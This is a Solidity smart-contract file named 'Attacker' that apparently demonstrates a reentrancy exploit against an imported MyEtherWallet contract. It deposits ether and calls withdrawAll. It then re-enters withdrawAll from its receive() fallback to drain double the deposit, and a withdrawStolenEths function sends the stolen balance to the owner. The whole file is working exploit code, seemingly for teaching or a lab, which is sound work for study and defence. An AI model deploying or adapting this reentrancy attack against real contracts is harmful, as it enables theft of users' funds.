// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./MyEtherWallet.sol";

contract Attacker {
    uint numberOfEnterance;
    address public owner;
    MyEtherWallet public myEtherWallet;

    constructor(MyEtherWallet myEtherWallet_) {
        owner = msg.sender;
        myEtherWallet = myEtherWallet_;
    }

    function stealFromWallet() public payable {
        //store some ether in the wallet
        (bool sent, ) = payable(address(myEtherWallet)).call{value: msg.value}(
            ""
        );
        require(sent, "Failed to send Ether to wallet");

        numberOfEnterance = 1;
        console.log("numberOfEnterance steal", numberOfEnterance);
        console.log("msg.value steal", msg.value);
        myEtherWallet.withdrawAll();
    }

    receive() external payable {
        // I want to steal only double the amount of input
        if (numberOfEnterance < 2) {
            ++numberOfEnterance;
            myEtherWallet.withdrawAll();
        }
        // else {
        //thanks you for sending twice the initial money
        // }
    }

    function withdrawStolenEths() public {
        require(msg.sender == owner);
        (bool sent, ) = payable(address(owner)).call{
            value: address(this).balance
        }("");
        require(sent, "Failed to withdraw stolen Eths");
    }
}
